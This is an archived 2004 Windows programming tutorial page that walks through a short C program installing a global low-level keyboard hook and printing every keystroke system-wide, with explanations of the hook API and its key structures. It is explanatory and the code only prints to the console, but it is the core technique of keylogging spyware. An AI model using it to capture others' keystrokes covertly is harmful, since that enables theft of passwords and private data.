<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">


<!-- Mirrored from www.vijaymukhi.com/security/windows/keystrokelogger.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:20 GMT -->
<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="keystrokelogger_files/filelist.html">
<title>Key Stroke Logger</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Mr. Vijay Mukhi</o:Author>
  <o:LastAuthor>Mr. Vijay Mukhi</o:LastAuthor>
  <o:Revision>11</o:Revision>
  <o:TotalTime>112</o:TotalTime>
  <o:Created>2004-03-29T10:58:00Z</o:Created>
  <o:LastSaved>2004-03-29T11:01:00Z</o:LastSaved>
  <o:Pages>2</o:Pages>
  <o:Words>921</o:Words>
  <o:Characters>5250</o:Characters>
  <o:Company>VMCI</o:Company>
  <o:Lines>43</o:Lines>
  <o:Paragraphs>10</o:Paragraphs>
  <o:CharactersWithSpaces>6447</o:CharactersWithSpaces>
  <o:Version>9.2720</o:Version>
 </o:DocumentProperties>
</xml><![endif]-->
<style>
<!--
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:windowtext;}
h6
	{mso-style-next:Normal;
	margin:0in;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:6;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Times New Roman";
	color:#000066;
	mso-text-raise:3.0pt;
	letter-spacing:1.0pt;
	font-weight:bold;}
a:link, span.MsoHyperlink
	{color:#0066FF;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p
	{margin-right:0in;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0in;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:black;}
pre
	{margin-top:.1in;
	margin-right:0in;
	margin-bottom:.1in;
	margin-left:0in;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	background:#EEEEEE;
	font-size:12.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";
	color:#660000;}
span.clsliteral
	{mso-style-name:clsliteral;}
@page Section1
	{size:8.5in 11.0in;
	margin:1.0in 1.25in 1.0in 1.25in;
	mso-header-margin:.5in;
	mso-footer-margin:.5in;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1026">
  <o:colormru v:ext="edit" colors="#fafaff"/>
  <o:colormenu v:ext="edit" fillcolor="#fafaff"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#fafaff" lang=EN-US link="#0066ff" vlink=purple
style='tab-interval:.5in'>

<div class=Section1>

<table border=1 cellspacing=0 cellpadding=0 width="100%" bgcolor="#eeeeff"
 style='width:100.0%;background:#EEEEFF;border-collapse:collapse;border:none;
 mso-border-alt:solid windowtext .5pt;mso-padding-alt:0in 5.4pt 0in 5.4pt'>
 <tr>
  <td width="100%" valign=top style='width:100.0%;border:solid windowtext .5pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <h6>Key Stroke Logger<sup><span style='mso-text-raise:0pt'><o:p></o:p></span></sup></h6>
  </td>
 </tr>
</table>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<pre style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:
.5in;margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>#define _WIN32_WINNT 0x0400<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>MSG m;HINSTANCE h;HHOOK k;char aa[100];KBDLLHOOKSTRUCT o;int i,key;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>__declspec(dllexport) __w64 __stdcall zzz(int code,unsigned int w,long l)<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>{<o:p></o:p></span></pre><pre style='margin-top:0in;margin-right:
.5in;margin-bottom:0in;margin-left:.5in;margin-bottom:.0001pt;background:transparent'><span
style='font-size:10.0pt;color:#000066'>KBDLLHOOKSTRUCT *o1;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>o = *((KBDLLHOOKSTRUCT*)l);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>key = o.scanCode &lt;&lt; 16;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>key += o.flags &lt;&lt; 24;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>GetKeyNameText(key,aa,100);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>printf(&quot;%s Code=%d w=%x ScanCode=%d Flags=%d vkCode=%d Time=%d \n&quot;,aa,code,w,o.scanCode,o.flags,o.vkCode,o.time);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>return CallNextHookEx(k,code,w,l);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>}<o:p></o:p></span></pre><pre style='margin-top:0in;margin-right:
.5in;margin-bottom:0in;margin-left:.5in;margin-bottom:.0001pt;background:transparent'><span
style='font-size:10.0pt;color:#000066'>int main()<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>{<o:p></o:p></span></pre><pre style='margin-top:0in;margin-right:
.5in;margin-bottom:0in;margin-left:.5in;margin-bottom:.0001pt;background:transparent'><span
style='font-size:10.0pt;color:#000066'>h = GetModuleHandle(0);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>printf(&quot;%x\n&quot;,h);<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>k = SetWindowsHookEx (WH_KEYBOARD_LL,zzz,h,0); //WH_KEYBOARD_LL=13<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>while (GetMessage(&amp;m,0,0,0)) <o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>DispatchMessage( &amp;m );<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>}<o:p></o:p></span></pre>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>We are writing a program called a keystroke logger. This
program will log every keystroke that you press in any application under
windows. We first start with a function GetModuleHandle. This function returns
a value of 400000. Each time you load a program under Windows, it is loaded at
a virtual address of 0x40000. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>As an experiment write a program using WinMain and not
main. The first parameter to the function WinMain is a number that tells you
where your program is loaded in memory and is always 0x400000. This number is a
handle to your application and it is here that windows loads your exe file or
dll. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The first two bytes will be M and Z. Normally we pass the
name of the module but if we pass 0 as in our case, it means the program
actually running.<o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The function SetWindowsHookEx is the most important
function in the above code.<span style="mso-spacerun: yes">  </span>This is the
function that windows gives us so that we can hook different type of
activities. The first parameter is the type of<span style="mso-spacerun: yes"> 
</span>hook we are interested in. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>There are 15 types of hooks we can capture ranging from
mouse to keyboard or shell etc. The macro WH_KEYBOARD is to be used for older
windows versions. The macro WH_KEYBOARD_LL is for Windows Nt upwards and
captures all low level keyboard messages. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The second parameter is the address of the function to be
called each time there is in our case a key pressed on the keyboard in our case
function zzz. The third parameter is the handle of the dll that contain the
function zzz. This function zzz normally resides in a dll. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>We would have used the function LoadLibrary to load the
dll in memory and passed the return value of that function as this parameter.
The last parameter would be 0 as this is the thread id of the thread that we
want to hook ourselves to. By specifying 0 we are saying hook keyboard events
for all threads. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>At the end of this function call, anytime anyone presses
a key, the function zzz will get called.<o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The function GetMessage waits for a message and till it
does not get one it sleeps on the job and lets windows do other work for other
applications. When it receives message it stores it in the MSG structure m and
returns non zero. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>A message would be a key stroke, a mouse movement, a
window wanting to be repainted. Any activity in the windows world is a message.
As an aside when the function GetMessage<span style="mso-spacerun: yes"> 
</span>receives a WM_QUIT message it will return 0. The DispatchMessage
actually send the message to a windows procedure that we registered when we
created the window. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>In our case there is no window created by the function
CreateWindow. When we press ctrl-C we will quit out of the while loop and the
program. Normally we would at the end of program use a function
UnhookWindowsHookEx function. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>Let us now move to the function that does gets called
each time we press a key under windows. This function zzz takes three
parameters. The first parameter is normally 0, the second parameter is normally
0x100 which means a key is pressed or 0x101 when a key is released. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>This function zzz gets called twice, once for a key press
and once for a key release. When we keep a key pressed, the value is 0x100 or
WM_KEYDOWN. The last parameter is a pointer to a structure KBDLLHOOKSTRUCT. </span></p>

<pre style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:
.5in;margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>typedef struct tagKBDLLHOOKSTRUCT {<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'><span style="mso-spacerun: yes">    </span>DWORD<span style="mso-spacerun: yes">   </span>vkCode;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'><span style="mso-spacerun: yes">    </span>DWORD<span style="mso-spacerun: yes">   </span>scanCode;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'><span style="mso-spacerun: yes">    </span>DWORD<span style="mso-spacerun: yes">   </span>flags;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'><span style="mso-spacerun: yes">    </span>DWORD<span style="mso-spacerun: yes">   </span>time;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'><span style="mso-spacerun: yes">    </span>ULONG_PTR dwExtraInfo;<o:p></o:p></span></pre><pre
style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:.5in;
margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>} KBDLLHOOKSTRUCT,<span style="mso-spacerun: yes">  </span>*LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;<o:p></o:p></span></pre>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>This structure has a member scanCode that contains the
scan code of each key pressed. This scan code is different from the ASCII
value. The scan code depends upon the physical layout of the key on the
keyboard. Thus<span style="mso-spacerun: yes">  </span>the key a has a scan
code of 30, s 31 and d 32. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The flag member is to read as individual bits. The first
bit tells us whether it is a extended key like the insert or home key. The bits
1-3 are reserved. The 5 bit tells us if the ALT key was pressed and the 7th or
last bit the transition state 0 if pressed, 1 if released. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>Thus we press the A key, the flags are 0, when we release
the 7th is 1, hence flags are 128. When we press the Insert key, bit 0 is 0n
and hence the values are 1 and 129. When we press the ALT key, the value of the
flags is 32.<o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The vkCode member is defined in the header file
winuser.h. Normally it is the ascii value of the key pressed. For the special
keys we have a large number of hash defines like<o:p></o:p></span></p>

<pre style='margin-top:0in;margin-right:.5in;margin-bottom:0in;margin-left:
.5in;margin-bottom:.0001pt;background:transparent'><span style='font-size:10.0pt;
color:#000066'>#define VK_HOME<span style="mso-spacerun: yes">           </span>0x24<o:p></o:p></span></pre>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>The last member time is the time in milliseconds when we
pressed a key. We would to display the key pressed not as a number but as a
character. Thus the backspace key we want displayed as backspace. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>We have been given a function GetKeyNameText that takes
an array as the second parameter, the length as the third. The array gets
filled up with a textual representation of the name. The first parameter is a
little complex to understand. We have to pass it the scan code in bits 16 to
23, in bit 24 the extended flags bit. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>In bit 25, the do not care bit which lets us distinguish
between keys like left and right shift which appear twice on the keyword. Thus
we take the scan code and shift it 16 bits to the left to occupy bits 16 to 23.
We then take the flags bit and left shift it 24 bits to the left. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>We then display all the variables and call the
CallNextHookEx function passing it our hook id, and the three parameters code,
w and l. If<span style="mso-spacerun: yes">  </span>we do not do this other
hooks will not get the key. If we return 1, we are telling the system not to
pass this key to the other applications. <o:p></o:p></span></p>

<p style='text-align:justify;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
style='color:#000066'>Thus we have the option of seeing to it that the
application that should have received the key does not. A value of 0 means pass
it on. We are also not allowed to modify the key as it goes over to the final
application. <o:p></o:p></span></p>

<p class=MsoNormal><span class=MsoHyperlink><b><a href="../../security.html">Back
to the main page</a><o:p></o:p></b></span></p>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

</div>

</body>


<!-- Mirrored from www.vijaymukhi.com/security/windows/keystrokelogger.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:21 GMT -->
</html>
